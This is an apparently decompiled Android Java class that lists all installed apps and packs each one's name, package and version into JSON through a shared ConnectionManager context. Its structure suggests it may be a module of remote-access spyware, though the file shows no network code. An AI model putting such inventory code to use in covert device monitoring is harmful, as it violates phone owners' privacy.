package com.example.project20;

import android.content.pm.PackageInfo;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class AppList {
    public static JSONObject getInstalledApps(boolean z) {
        JSONArray jSONArray = new JSONArray();
        List<PackageInfo> installedPackages = ConnectionManager.context.getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < installedPackages.size(); i++) {
            PackageInfo packageInfo = installedPackages.get(i);
            if (z || packageInfo.versionName != null) {
                try {
                    JSONObject jSONObject = new JSONObject();
                    String charSequence = packageInfo.applicationInfo.loadLabel(ConnectionManager.context.getPackageManager()).toString();
                    String str = packageInfo.packageName;
                    String str2 = packageInfo.versionName;
                    int i2 = packageInfo.versionCode;
                    jSONObject.put("appName", charSequence);
                    jSONObject.put("packageName", str);
                    jSONObject.put("versionName", str2);
                    jSONObject.put("versionCode", i2);
                    jSONArray.put(jSONObject);
                } catch (JSONException unused) {
                }
            }
        }
        JSONObject jSONObject2 = new JSONObject();
        try {
            jSONObject2.put("apps", jSONArray);
        } catch (JSONException unused2) {
        }
        return jSONObject2;
    }
}
